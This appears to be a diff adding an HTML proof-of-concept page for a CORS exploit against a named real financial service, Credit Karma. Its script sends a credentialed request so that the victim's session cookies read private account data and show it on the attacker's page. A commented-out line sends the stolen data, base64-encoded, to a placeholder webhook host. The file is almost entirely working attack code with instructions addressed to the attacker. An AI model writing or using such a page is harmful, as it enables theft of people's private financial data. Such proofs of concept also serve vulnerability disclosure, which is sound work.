@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS Exploit PoC</title></head>
+<body>
+    <h2>CORS Data Exfiltration Proof</h2>
+    <p>If the box below fills with data, the vulnerability is confirmed.</p>
+    <textarea id="output" style="width: 500px; height: 300px;"></textarea>
+
+    <script>
+        var xhr = new XMLHttpRequest();
+        // REPLACE THIS with the sensitive Credit Karma endpoint you found
+        var targetUrl = "https://www.creditkarma.com/api/v1/sensitive-data"; 
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                // This displays the victim's private data on the attacker's page
+                document.getElementById("output").value = xhr.responseText;
+                
+                // EXTRA CREDIT: Send the data to your own logs
+                // fetch("https://your-webhook-url.com/log?data=" + btoa(xhr.responseText));
+            }
+        };
+
+        xhr.open("GET", targetUrl, true);
+        xhr.withCredentials = true; // Essential to send the victim's session cookies
+        xhr.send();
+    </script>
+</body>
+</html>
